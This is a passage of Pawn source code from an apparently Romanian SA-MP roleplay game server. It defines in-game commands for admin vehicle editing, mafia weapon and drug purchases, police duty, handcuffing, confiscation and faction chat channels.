	}
	return -1;
}

cmd:editvehicle(playerid, params[]) {	
	new dbid=-1;
	if(!IsAdmin(playerid, 7)) 
		return true;

	extract params -> new string:option[24], result; else {
		SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/editvehicle <option> <result>");
		SendClientMessage(playerid, COLOR_WHITE, "Avaiable: Model, Color1, Color2, Faction, Rank.");
		return true;
	}

	if(!(dbid=GetPlayerVehicleID(playerid)))
		return true;

	if !ServerVehicles[dbid][vID] *then 
		return SendClientMessage(playerid, COLOR_GREY, "Acest vehicul nu face parte din baza de date.");

	switch YHash(option) do {
		case _H<model>: {
		    if(result < 400 || result > 611) return SendClientMessage(playerid, COLOR_GREY, "Modelul vehiculului este invalid.");
			DestroyVehicleEx(dbid, "");
			CreateVehicleEx(result, ServerVehicles[dbid][vLocation][0], ServerVehicles[dbid][vLocation][1], ServerVehicles[dbid][vLocation][2], ServerVehicles[dbid][vAngle], ServerVehicles[dbid][vColor][0], ServerVehicles[dbid][vColor][1]);
			PutPlayerInVehicleEx(playerid, dbid, 0);
			ServerVehicles[dbid][vModel] = result;
			SCMf(playerid, COLOR_LGREEN, "Ai schimbat cu succes modelul acestui vehicul (vID: %d) in: %d.", dbid, result);
			_query("UPDATE `svehicles` SET `vModel` = '%d' WHERE `vID` = '%d'", result, ServerVehicles[dbid][vID]);
		}
		case _H<color1>: {
		    if(result < 0 || result > 256) return SendClientMessage(playerid, COLOR_GREY, "ID-ul culorii este invalid.");
			ChangeVehicleColorEx(dbid, result, ServerVehicles[dbid][vColor][1]);
			ServerVehicles[dbid][vColor][0] = result;
			SCMf(playerid, COLOR_LGREEN, "Ai schimbat cu succes culoarea acestui vehicul (vID: %d) in: %d.", dbid, result);

			_query("UPDATE `svehicles` SET `Color1` = '%d' WHERE `vID` = '%d'", result, ServerVehicles[dbid][vID]);
		}
		case _H<color2>: {
		    if(result < 0 || result > 256) return SendClientMessage(playerid, COLOR_GREY, "ID-ul culorii este invalid.");
			ChangeVehicleColorEx(dbid, ServerVehicles[dbid][vColor][0], result);
			ServerVehicles[dbid][vColor][1] = result;
			SCMf(playerid, COLOR_LGREEN, "Ai schimbat cu succes culoarea acestui vehicul (vID: %d) in: %d.", dbid, result);
			_query("UPDATE `svehicles` SET `Color2` = '%d' WHERE `vID` = '%d'", result, ServerVehicles[dbid][vID]);
		}
		case _H<faction>: {
			new f;
			switch(result) {
				case 4: f=0;
				case 5: f=1;
				case 6: f=2;
				case 10: f=3;
				case 17: f=4;
				case 18: f=5;
				case 25: f=6;
				case 26: f=7;
				case 27: f=8;
				default: return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Poti edita doar cu ID-urile de la mafii.");
			}
			if(is_mafiot_vehicle(dbid)!=-1) Iter_Remove(FactionVehicle<is_mafiot_vehicle(dbid)>, dbid);
			ServerVehicles[dbid][vFaction] = result;
			Iter_Add(FactionVehicle<f>, dbid);
			SCMf(playerid, COLOR_LGREEN, "Ai schimbat cu succes id-ul factiunii al acestui vehicul (vID: %d) in: %d.", dbid, result);

			_query("UPDATE `svehicles` SET `Faction` = '%d' WHERE `vID` = '%d'", result, ServerVehicles[dbid][vID]);
		}
		case _H<rank>: {
			ServerVehicles[dbid][vRank] = result;
			SCMf(playerid, COLOR_LGREEN, "Ai schimbat cu succes rank-ul necesar al acestui vehicul (vID: %d) in: %d.", dbid, result);

	 		_query("UPDATE `svehicles` SET `Rank` = '%d' WHERE `vID` = '%d'", result, ServerVehicles[dbid][vID]);
		}
	}
	return true;
}
redist::SQL_vehicle_cache_ID(carid) return ServerVehicles[carid][vID] = cache_insert_id();

cmd:getheroin(playerid, params[]) {
	if(!IsMafie(playerid)) return true;
	if(GetPlayerInterior(playerid) == 0) return true;
	new x = PlayerInfo[playerid][pMember]-1;

	if(GetPlayerCash(playerid)<2000000)
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai $2,000,000!");

	SafeInfo[x][sDrugs]+=10;
	SafeInfo[x][sMoney]+=2000000;
	GivePlayerCash(playerid, -2000000);
	PlayerInfo[playerid][pDrugs]-=10;
	PlayerInfo[playerid][pHeroin]++;
	SaveSeif(x);
	SendClientMessage(playerid, COLOR_MONEY, "(Get Heroin): {FFFFFF}Ai cumparat o pastila si ai platit $2,000,000 + 10 droguri din seiful HQ-ului.");
    return true;
}

cmd:order(playerid, params[]) {
	if(PlayerInfo[playerid][pMember] == 11) {
		new result[30];
		if(!PlayerToPoint(100, playerid, -2158.6482,642.3111,1052.3750)) return SendClientMessage(playerid, COLOR_GREY, "Nu esti in HQ!");
		if(PlayerHit[playerid] == -1) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Poti lua arme doar atunci cand ai un contract!");
		if(sscanf(params, "s[30]", result)) {
			SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/order <id>");
			SendClientMessage(playerid, COLOR_WHITE, "1. Knife (10 $) | 2. SD-Pistol (100 $) | 3. Sniper (200 $)");
			return true;
		}
		if(PlayerInfo[playerid][pGunLic] == 0) return SendClientMessage(playerid,-1,"Nu ai licenta de arme!");
		if(strcmp(result,"1",true) == 0) {
			if(GetPlayerCash(playerid) < 10) return true;
			ServerWeapon(playerid, 4, 200);
			SendClientMessage(playerid, COLOR_MONEY, "Ti-ai cumparat un cutit la pretul de 10$.");
			GivePlayerCash(playerid, -10);
			return true;
		}
		else if(strcmp(result,"2",true) == 0) {
			if(GetPlayerCash(playerid) < 100) return true;
			ServerWeapon(playerid, 23, 200);
			SendClientMessage(playerid, COLOR_MONEY, "Ti-ai cumparat un SD-Pistol la pretul de 100$.");
			GivePlayerCash(playerid, -100);
			return true;
		}
		else if(strcmp(result,"3",true) == 0) {
			if(GetPlayerCash(playerid) < 200) return true;
			ServerWeapon(playerid, 34, 200);
			SendClientMessage(playerid, COLOR_MONEY, "Ti-ai cumparat un Sniper la pretul de 200$.");
			GivePlayerCash(playerid, -200);
			return true;
		}
		else return SendClientMessage(playerid, COLOR_GREY, "Invalid id!");
	}	
	if(!IsMafie(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu esti membrul unei mafii.");
	if(PlayerInfo[playerid][pGunLic] == 0) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai licenta de arme.");
	if(GetPlayerInterior(playerid) == 0) return SendClientMessage(playerid, COLOR_WHITE,"Nu esti in HQ.");
	if(!IsAtOrderPlace(playerid)) return true;
	new x = PlayerInfo[playerid][pMember]-1;

	if(SafeInfo[x][sMaterials] < ValueMafie[0][1] && SafeInfo[x][sMoney] < ValueMafie[0][0])
		return SendClientMessage(playerid, COLOR_GREY, "Nu ai materiale sau bani de ajuns.");

	new total,money,mats;
	for(new i=0;i<5;i++) {
		if(!PlayerInfo[playerid][pGuns][i]) continue;
		money+=ValueMafie[i][0];
		mats+= ValueMafie[i][1];	
		total++;
	}

	if(!total) 
		return SendClientMessage(playerid, COLOR_GREY, "Nu ai o arma setata in (/setguns).");

	if(SafeInfo[x][sMaterials]<mats)
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu sunt destule materiale in seif!");

	if(GetPlayerCash(playerid)<money)
		return SendClientMessage(playerid, COLOR_LIGHTGREEN, "Eroare: Nu ai destui bani");

	SafeInfo[x][sMaterials]-=mats;
	GivePlayerCash(playerid, -money);
	for(new i = 0; i < 5; i++) if(PlayerInfo[playerid][pGuns][i]) ServerWeapon(playerid, GunMafieID[0][i], 60);
	SaveSeif(x);
	format(gString, 130, "(/order) {FFFFFF}Ai cumparat %d arme setate si ai platit $%s. Au fost retrase %d materiale din seiful factiunii.", total, FormatNumber(money), FormatNumber(mats));
	SendClientMessage(playerid, COLOR_GREEN, gString);		
    return true;
}

stock IsMafie(playerid) {
	switch(PlayerInfo[playerid][pMember]) {case 4,5,6,10,17,18,25,26,27: return true;}
	return false;
}
cmd:setguns(playerid, params[]) {
	if(!IsMafie(playerid)) 
		return true;

	gString[0] = EOS;
	strcat(gString, "Weapon name\tRank\tStatus\n{FFFFFF}");
	for(new i = 0; i < 4; i++) format(gString, 256, "%s%s\trank %d+\t%s\n", gString, GunMafie[i][gunName], GunMafie[i][gunRank], PlayerInfo[playerid][pGuns][i] ? ("{00ff00}selected") : ("{ff0000}not selected"));
	ShowPlayerDialog(playerid, DIALOG_SETGUN, DIALOG_STYLE_TABLIST_HEADERS, "SERVER: Set guns", gString, "Select", "Cacnel");
	return true;
}
save_guns(playerid) {
	gQuery[0] = EOS;
	mysql_format(SQL, gQuery, 500, "UPDATE `users` SET `Guns`='%i %i %i %i' WHERE `id`='%d'", PlayerInfo[playerid][pGuns][0], PlayerInfo[playerid][pGuns][1], PlayerInfo[playerid][pGuns][2], 
	PlayerInfo[playerid][pGuns][3], 
	PlayerInfo[playerid][pSQLID]);
	mysql_tquery(SQL, gQuery, "", "");
}
cmd:wars(playerid, params[]) {
	new string[256], wars;
	SendClientMessage(playerid, COLOR_MONEY, "[WARS]:");
	for(new i = 1; i < sizeof(TurfInfo); i++) {
		if(WarInfo[i][wAttacker] != 0) {
			format(string, sizeof(string), "%s [score: %0.2f] - %s [score: %0.2f] on turf %d. Time left: %s", FactionName(WarInfo[i][wAttacker]), WarScoreF[WarInfo[i][wAttacker]][InWarTurf[WarInfo[i][wAttacker]]], FactionName(WarInfo[i][wFaction]), WarScoreF[WarInfo[i][wFaction]][InWarTurf[WarInfo[i][wAttacker]]], i, CalculeazaTimp2(WarInfo[i][wTime]));
			SendClientMessage(playerid, -1, string);
			wars ++;
		}
	}	
	if(wars == 0) SendClientMessage(playerid, -1, "There are no wars on the server at the moment.");
	return true;
}
cmd:rainbowspeed(playerid, params[]) {
	#pragma unused params 

	new idd = FindSpawnID(GetPlayerVehicleID(playerid));
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendErrorMsg(playerid, "Nu esti in unul dintre vehiculele tale personale!");
	if(!IsPlayerInAnyVehicle(playerid)) return SendErrorMsg(playerid, "Nu esti intr-un vehicul!");
	if(CarInfo[idd][Userid] != PlayerInfo[playerid][pSQLID]&&(CarInfo[idd][cClan]!=PlayerInfo[playerid][pClan]||!PlayerInfo[playerid][pClan])) return true;
	if(!CarInfo[idd][cRainBow]) return SendErrorMsg(playerid, "Vehiculul tau nu are aceasta optiune!");
	if(idd == -1) return SendErrorMsg(playerid, "Nu te afli intr-un vehicul personal");
	
    return ShowPlayerDialog(playerid, DIALOG_RAINBOWSPEED, DIALOG_STYLE_LIST, "{F4AD42}Rainbow {FFFFFF}Menu", "{FF0000}Disable Rainbow\n{FFFFFF}Rainbow Speed #1\nRainbow Speed #2\nRainbow Speed #3", "Select", "Cancel");
}
redist::ChangeRainbowColors(playerid) {
	if(!IsPlayerInAnyVehicle(playerid)) return true;
	new idd=FindSpawnID(GetPlayerVehicleID(playerid));
	if(idd==-1) return true;
	switch CarInfo[idd][cRainBow] do {
		case 1: K[playerid]=(K[playerid]<62?K[playerid]+1:0),ChangeVehicleColor(masinaRainbow[playerid], RainBowColor[K[playerid]], RainBowColor[K[playerid]]);
		case 2: K[playerid]=(K[playerid]<sizeof RainbowRed-1?K[playerid]+1:0),ChangeVehicleColor(masinaRainbow[playerid], RainbowRed[K[playerid]], RainbowRed[K[playerid]]);
		case 3: K[playerid]=(K[playerid]<sizeof RainbowBlue-1?K[playerid]+1:0),ChangeVehicleColor(masinaRainbow[playerid], RainbowBlue[K[playerid]], RainbowBlue[K[playerid]]);
		case 4: K[playerid]=(K[playerid]<sizeof RainbowGreen-1?K[playerid]+1:0),ChangeVehicleColor(masinaRainbow[playerid], RainbowGreen[K[playerid]], RainbowGreen[K[playerid]]);
		case 5: K[playerid]=(K[playerid]<sizeof RainbowYellow-1?K[playerid]+1:0),ChangeVehicleColor(masinaRainbow[playerid], RainbowYellow[K[playerid]], RainbowYellow[K[playerid]]);
	}
    return true;
}
cmd:megaphone(playerid, params[]) {
	if(!OnDuty[playerid]) return SendErrorMsg(playerid, "Nu esti duty!");
	if(PlayerInfo[playerid][pMuted]) return SendErrorMsg(playerid, "You can't talk right now! You are muted. (%d seconds)", PlayerInfo[playerid][pMuteTime]);
	extract params -> new string:textmeg[128]; else return SendUsageMsg(playerid, "m [text]");
	if(!IsACop(playerid)) return SendErrorMsg(playerid, "Nu faci parte din factiunea politiei.");
	if(!Copcar2(GetPlayerVehicleID(playerid))) return SendErrorMsg(playerid, "Nu esti intr-un vehicul de-al factiunii.");
    
	gString[0] = EOS;
	switch(PlayerInfo[playerid][pMember]) {
		case 1,14,19: format(gString, 144, "> Ofiter %s: %s <", GetName(playerid), textmeg);
		case 2: format(gString, 144, "> Agent %s: %s <", GetName(playerid), textmeg);
		case 3: format(gString, 144, "> Soldat %s: %s <", GetName(playerid), textmeg);
	}
	ProxDetector(60.0, playerid, gString, COLOR_YELLOW);
	return true;
}
cmd:radio(playerid, params[]) {
	new bool:t=false;
	switch(PlayerInfo[playerid][pMember]) { case 1,2,3,13,14,19: t=true; }
	switch(PlayerInfo[playerid][pLeader]) { case 1,2,3,13,14,19: t=true; }
	switch(SpecFaction[playerid]) { case 1,2,3,13,14,19: t=true; }
	if(!t) return SendClientMessage(playerid, COLOR_GREY, "Nu faci parte din factiunea politiei.");

	if(PlayerInfo[playerid][pMuted])
		return SCMf(playerid, COLOR_GREY, "You can't talk right now! You are muted. (%d seconds)",PlayerInfo[playerid][pMuteTime]);

	if(FactionChat[PlayerInfo[playerid][pMember]] == 1 && PlayerInfo[playerid][pRank] < 6) return SendClientMessage(playerid, COLOR_GREY, "Chatul factiunii a fost oprit!");
	if(sscanf(params, "s[120]", params)) return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/r <text>");
	if(!SpecFaction[playerid]) {
		SendRadioMessage(PlayerInfo[playerid][pMember], 0x8D8DFFFF, "* %s %s: %s, over.", GetRankName(playerid), GetName(playerid), params);
	} else {
		SendRadioMessage(SpecFaction[playerid], 0x8D8DFFFF, "* Admin %s: %s, over.", GetName(playerid), params);
	}
	return true;
}
cmd:duty(playerid, params[]) {
	if(!IsACop(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu esti politist!");
	if(PlayerInfo[playerid][pGunLic] == 0) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai licenta de arme. Cauta un instructor pentru a obtine licenta.");
	if(PlayerInfo[playerid][pSleeping]) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti folosi aceasta comanda deoarece esti pe sleep!");
	if(GetPlayerInterior(playerid) == 0) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu esti in HQ-ul tau!");
	switch InInterior[playerid] do {
		case INVALID_INTERIOR: return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu esti in HQ-ul tau!");
		case HQ_INTERIOR: {
			switch InInteriorID[playerid] do { case 1,2,3,14,19: {} default: return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu esti in HQ-ul tau!"); }
		}
		case HOUSE_INTERIOR: if InInteriorID[playerid] != PlayerInfo[playerid][pHouse] && PlayerInfo[playerid][pHouse] *then return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu esti in HQ-ul tau!");
		default: return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu esti in HQ-ul tau!");
	}
	gString[0] = (EOS);
	if(!OnDuty[playerid]) {
		if(PlayerInfo[playerid][pWantedLevel] != 0 || PlayerInfo[playerid][pJailTime] != 0) return SendClientMessage(playerid, COLOR_LGREEN, "Nu poti folosi aceasta comanda deoarece esti in jail sau ai wanted.");
		format(gString, 128, "%s takes some guns and a badge from his locker.", GetName(playerid));
		ProxDetector(30.0, playerid, gString, COLOR_PURPLE);
		ServerWeapon(playerid, 24, 500);
		ServerWeapon(playerid, 3, 0);
		ServerWeapon(playerid, 41, 500);
		ServerWeapon(playerid, 29, 1000);
		ServerWeapon(playerid, 31, 1000);
		SetPlayerArmourEx(playerid, 99);
		SetPlayerHealthEx(playerid, 99);
		PlayerTextDrawSetString(playerid, dutyTD, "normal duty");
		PlayerTextDrawShow(playerid, dutyTD);
		OnDuty[playerid] = true;
		SetPlayerSkin(playerid, faction_skin(playerid));
		SendClientMessage(playerid, -1, "You are now on duty!");				
	}
	else {
		format(gString, 128, "%s puts his badge and uniform in his locker.", GetName(playerid));
		ProxDetector(30.0, playerid, gString, COLOR_PURPLE);				
		SetPlayerArmourEx(playerid, 0);
		ResetWeapons(playerid);
		SetPlayerSkin(playerid, PlayerInfo[playerid][pModel]);
		tazer[playerid] = 0;	
		PlayerTextDrawHide(playerid, dutyTD);
		SendClientMessage(playerid, -1, "You are now off duty!");
		OnDuty[playerid] = false;		
	}
	SetPlayerToTeamColor(playerid);
	return true;
}

cmd:uduty(playerid, params[]) {
	if(!IsACop(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu esti politist!");
	if(PlayerInfo[playerid][pRank] < 5) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai nevoie de rank 5+");
	if(PlayerInfo[playerid][pGunLic] == 0) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai licenta de arme. Cauta un instructor pentru a obtine licenta.");
	if(PlayerInfo[playerid][pSleeping]) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti folosi aceasta comanda deoarece esti pe sleep!");
	if(GetPlayerInterior(playerid) == 0) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu esti in HQ-ul tau!");
	switch InInterior[playerid] do {
		case INVALID_INTERIOR: return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu esti in HQ-ul tau!");
		case HQ_INTERIOR: {
			switch InInteriorID[playerid] do { case 1,2,3,14,19: {} default: return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu esti in HQ-ul tau!"); }
		}
		case HOUSE_INTERIOR: if InInteriorID[playerid] != PlayerInfo[playerid][pHouse] && PlayerInfo[playerid][pHouse] *then return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu esti in HQ-ul tau!");
		default: return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu esti in HQ-ul tau!");
	}
	
	gString[0] = (EOS);
	if(!OnDuty[playerid]) {
		if(PlayerInfo[playerid][pWantedLevel] != 0 || PlayerInfo[playerid][pJailTime] != 0) return SendClientMessage(playerid, COLOR_LGREEN, "Nu poti folosi aceasta comanda deoarece esti in jail sau ai wanted.");
		format(gString, 128, "%s takes some guns and a badge from his locker.", GetName(playerid));
		ProxDetector(30.0, playerid, gString, COLOR_PURPLE);
		ServerWeapon(playerid, 24, 500);
		ServerWeapon(playerid, 3, 0);
		ServerWeapon(playerid, 41, 500);
		ServerWeapon(playerid, 29, 1000);
		ServerWeapon(playerid, 31, 1000);
		SetPlayerHealthEx(playerid, 99);
		SetPlayerColor(playerid, COLOR_WHITE);
		PlayerTextDrawSetString(playerid, dutyTD, "undercover duty");
		PlayerTextDrawShow(playerid, dutyTD);
		OnDuty[playerid] = 2;
		SendClientMessage(playerid, -1, "You are now on undercover duty!");				
	}
	else {
		format(gString, 128, "%s puts his badge and uniform in his locker.", GetName(playerid));
		ProxDetector(30.0, playerid, gString, COLOR_PURPLE);				
		SetPlayerArmourEx(playerid, 0);
		ResetWeapons(playerid);
		tazer[playerid] = 0;	
		PlayerTextDrawHide(playerid, dutyTD);
		SendClientMessage(playerid, -1, "You are now off duty!");
		OnDuty[playerid] = false;		
	}
	return true;
}

cmd:cf(playerid, params[]) {
	extract params -> new player:id; else
		return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/cf <playerid/name>");

	if !IsPlayerConnected(id) *then 
		return SendClientMessage(playerid, COLOR_GREY, "That user is not connected.");

	if !IsPlayerLogged(id) *then
		return SendClientMessage(playerid, COLOR_GREY, "Acel player nu este logat!");

	if GetPlayerState(playerid) != PLAYER_STATE_DRIVER *then 
		return true;

	if !IsPlayerInVehicle(id, GetPlayerVehicleID(playerid)) *then 
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Acel player nu este in vehiculul tau!");

	if !PlayerInfo[id][pWantedLevel] *then 
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Acel player nu are wanted!");
	SendTeamMessage(1, COLOR_DEPART2, "* %s %s: %s este la mine, over.", GetRankName(playerid), GetName(playerid), GetName(id));
	TogglePlayerControllable(id, 0);
	format(gString, 128, "* %s has handcuffed %s.", GetName(playerid),GetName(id));
	ProxDetector(30.0, playerid, gString, COLOR_PURPLE);
	PlayerCuffed2[id] = 1;
	SetPlayerAttachedObject(id, 1, 19418, 6, -0.011000, 0.028000, -0.022000, -15.600012, -33.699977, -81.700035, 0.891999, 1.000000, 1.168000);
	SetPlayerSpecialAction(id,SPECIAL_ACTION_CUFFED);	
	return true;
}
cmd:departments(playerid, params[]) {
	if PlayerInfo[playerid][pMuted] *then
		return SCMf(playerid, COLOR_GREY, "You can't talk right now! You are muted. (%d seconds)",PlayerInfo[playerid][pMuteTime]);

	if sscanf(params, "s[250]", params) *then 
		return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/d <text>");

	if(FaceReclama(params)) 
		return RemoveFunction(playerid, params), Reclama(playerid, params);

	if(!PlayerInfo[playerid][pAdmin]) {
		switch(PlayerInfo[playerid][pMember]) {
			case 1,2,3,13,14: {}
			default: return SendClientMessage(playerid, COLOR_GREY, "Nu faci parte din factiunea politiei.");
		}
	}
	if(PlayerInfo[playerid][pAdmin]) format(gString, 128, "* Admin %s: %s, over.", GetName(playerid), params);
	else format(gString, 128, "* %s %s: %s, over.", FactionName(PlayerInfo[playerid][pMember]), GetName(playerid), params);
	foreach(new i: Staff<ADMIN>) SendClientMessage(i, COLOR_DEPART2, gString);

	for(new f[]={1,2,3,13,14,19},i=0;i<sizeof f;++i) {
		foreach(new p : faction_players<f[i]>) {
			if(Iter_Contains(Staff<ADMIN>, p)) continue;
			sendSplittedMessageToPlayer(p, COLOR_DEPART2, COLOR_DEPART2, gString);
		}
	}
	return true;
}

cmd:restriction(playerid, params[]) {
	if(!IsACop(playerid))
		return SendClientMessage(playerid, COLOR_GREY, "Nu faci parte dintr-un departament.");

	extract params -> new player:id, string:reason[32]; else
		return SendClientMessage(playerid ,COLOR_GREY, "USAGE: {FFFFFF}/restriction <playerid/name> <reason>");

	if(!IsPlayerConnected(id))
		return SendClientMessage(playerid, COLOR_GREY, "Player not connected!");

	if(!IsPlayerLogged(id))
		return SendClientMessage(playerid, COLOR_GREY, "Player not logged");

	if(playerid == id)
		return SendClientMessage(playerid, COLOR_GREY, "Nu iti poti da singur restrictie.");

	if(!PlayerInfo[id][pJailTime])
		return SendClientMessage(playerid, COLOR_GREY, "Acel player nu este in jail!");

	if(PlayerInfo[id][pRestriction])
		return SendClientMessage(playerid, COLOR_GREY, "Acel player are deja o restrictie.");

	PlayerInfo[id][pRestriction] = true;
	UpdateVar(id, "restriction", true);

	SendTeamMessage(1, 0x2e64feFF, "Dispatch: %s a primit restrictie FREE de la %s, motiv: %s.", GetName(id), GetName(playerid), reason);
	SCMf(id, COLOR_YELLOW, "* Ai primit restrictie FREE de la %s, motiv: %s", GetName(playerid), reason);
	return true;
}

cmd:unrestriction(playerid, params[]) {
	if(!IsACop(playerid))
		return SendClientMessage(playerid, COLOR_GREY, "Nu faci parte dintr-un departament.");

	extract params -> new player:id, string:reason[32]; else
		return SendClientMessage(playerid ,COLOR_GREY, "USAGE: {FFFFFF}/unrestriction <playerid/name> <reason>");

	if(!IsPlayerConnected(id))
		return SendClientMessage(playerid, COLOR_GREY, "Player not connected!");

	if(!IsPlayerLogged(id))
		return SendClientMessage(playerid, COLOR_GREY, "Player not logged");

	if(playerid == id)
		return SendClientMessage(playerid, COLOR_GREY, "Nu iti poti da singur restrictie.");

	if(!PlayerInfo[id][pJailTime])
		return SendClientMessage(playerid, COLOR_GREY, "Acel player nu este in jail!");

	if(!PlayerInfo[id][pRestriction])
		return SendClientMessage(playerid, COLOR_GREY, "Acel player nu are o restrictie.");

	PlayerInfo[id][pRestriction] = false;
	UpdateVar(id, "restriction", false);

	SendTeamMessage(1, 0x2e64feFF, "Dispatch: %s i-a ridicat restrictia FREE lui %s, motiv: %s", GetName(playerid), GetName(id), reason);
	SCMf(id, COLOR_YELLOW, "* %s ti-a ridicat restrictia FREE, motiv: %s.", GetName(playerid), reason);
	return true;
}

cmd:in(playerid, params[]) {
	switch(PlayerInfo[playerid][pMember]) {
		case 7,16,21: {}
		default: return SendClientMessage(playerid, COLOR_GREY, "Nu faci parte din factiunea respectiva.");
	}

	if PlayerInfo[playerid][pMuted] *then
		return SCMf(playerid, COLOR_GREY, "You can't talk right now! You are muted. (%d seconds)",PlayerInfo[playerid][pMuteTime]);

	if sscanf(params, "s[250]", params) *then 
		return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/in <text>");

	if(FaceReclama(params)) 
		return RemoveFunction(playerid, params), Reclama(playerid, params);

	SendTeamMessage(7, COLOR_DEPART2, "* %s %s: %s.", GetRankName(playerid), GetName(playerid), params);
	return true;
}

cmd:tx(playerid, params[]) {
	switch(PlayerInfo[playerid][pMember]) {
		case 12,15,23: {}
		default: return SendClientMessage(playerid, COLOR_GREY, "Nu faci parte din factiunea respectiva.");
	}

	if PlayerInfo[playerid][pMuted] *then
		return SCMf(playerid, COLOR_GREY, "You can't talk right now! You are muted. (%d seconds)",PlayerInfo[playerid][pMuteTime]);

	if sscanf(params, "s[250]", params) *then 
		return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/tx <text>");

	if(FaceReclama(params)) 
		return RemoveFunction(playerid, params), Reclama(playerid, params);

	SendTeamMessage(12, COLOR_DEPART2, "* %s %s: %s.", GetRankName(playerid), GetName(playerid), params);
	return true;
}

cmd:tc(playerid, params[]) {
	switch(PlayerInfo[playerid][pMember]) {
		case 8,22: {}
		default: return SendClientMessage(playerid, COLOR_GREY, "Nu faci parte din factiunea respectiva.");
	}

	if PlayerInfo[playerid][pMuted] *then
		return SCMf(playerid, COLOR_GREY, "You can't talk right now! You are muted. (%d seconds)",PlayerInfo[playerid][pMuteTime]);

	if sscanf(params, "s[250]", params) *then 
		return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/tc <text>");

	if(FaceReclama(params)) 
		return RemoveFunction(playerid, params), Reclama(playerid, params);

	SendTeamMessage(8, COLOR_DEPART2, "* %s %s: %s.", GetRankName(playerid), GetName(playerid), params);
	return true;
}

cmd:confiscate(playerid, params[]) {
    if !IsACop(playerid) *then 
    	return SendClientMessage(playerid,  COLOR_GREY, "Your group data is invalid.");
	
	if !OnDuty[playerid] *then 
		return SendClientMessage(playerid, COLOR_LGREEN, "Nu poti folosi aceasta comanda deoarece nu esti la datorie!");

	extract params -> new player:id, string:item[15]; else {
		SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/confiscate <playerid/name> <item>");
		SendClientMessage(playerid, COLOR_WHITE, "Items: License, Weapons, Drugs, Heroin.");
		return true;
	}
	if !IsPlayerConnected(id) *then
		return SendClientMessage(playerid, COLOR_GREY, "That user is not connected.");

	if(!ProxDetectorS(8.0, playerid, id)) return SendClientMessage(playerid, -1, "Acel player nu este langa tine.");
	if(IsACop(id) && OnDuty[id] == 1) return SendClientMessage(playerid, COLOR_GREY, "Nu poti confisca armele unui politist!");
	switch YHash(item) do {
		case _H<license>: {
			if !PlayerInfo[id][pCarLic] *then 
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Acel player nu are o licenta de condus!");

			SCMf(id, COLOR_LIGHTBLUE, "* Ofiter %s ti-a confiscat licenta de condus.", GetName(playerid));
			PlayerInfo[id][pCarLic] = 0;
			PlayerInfo[id][pCarLicS] = 2;
			_query("UPDATE users SET `CarLic`='0',`CarLicT`='0',`CarLicS`='2' WHERE `ID`='%d'",PlayerInfo[id][pSQLID]);
			AddFactionRaport(playerid, 2);	
			if IsPlayerInAnyVehicle(playerid) *then RemovePlayerFromVehicleEx(playerid);
		}
		case _H<weapons>: {
			if !HaveWeapons(playerid) *then 
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Acel player nu are arme!");
			
			SCMf(id, COLOR_LIGHTBLUE, "* Officer %s ti-a confiscat armele.", GetName(playerid));
			ResetWeapons(id);
		}
		case _H<drugs>: {
			if !PlayerInfo[id][pDrugs] *then 
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Acel player nu are droguri!");
			
			SCMf(id, COLOR_LIGHTBLUE, "* Officer %s ti-a confiscat drogurile.", GetName(playerid));
			PlayerInfo[id][pDrugs] = 0;
			_query("UPDATE users SET `Drugs`='0' WHERE `ID`='%d'",PlayerInfo[id][pSQLID]);
			AddFactionRaport(playerid, 2);
		}
		case _H<heroin>: {
			if !PlayerInfo[id][pHeroin] *then 
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Acel player nu are heroina!");
			
			SCMf(id, COLOR_LIGHTBLUE, "* Officer %s ti-a confiscat heroina.", GetName(playerid));
			PlayerInfo[id][pHeroin] = 0;
			_query("UPDATE users SET `Heroin`='0' WHERE `ID`='%d'",PlayerInfo[id][pSQLID]);
			AddFactionRaport(playerid, 2);
		}
		default: return SendClientMessage(playerid, COLOR_GREY, "Item invalid!");
	}
	SendTeamMessage(1, 0x2e64feFF, "* %s has confiscated %s's %s.", GetName(playerid), GetName(id), item);
    return true;
}
cmd:mdc(playerid, params[]) {
	if !IsACop(playerid) && !IsAdmin(playerid, 1) *then return SendClientMessage(playerid, COLOR_GREY, "Nu faci parte din factiunea politiei.");
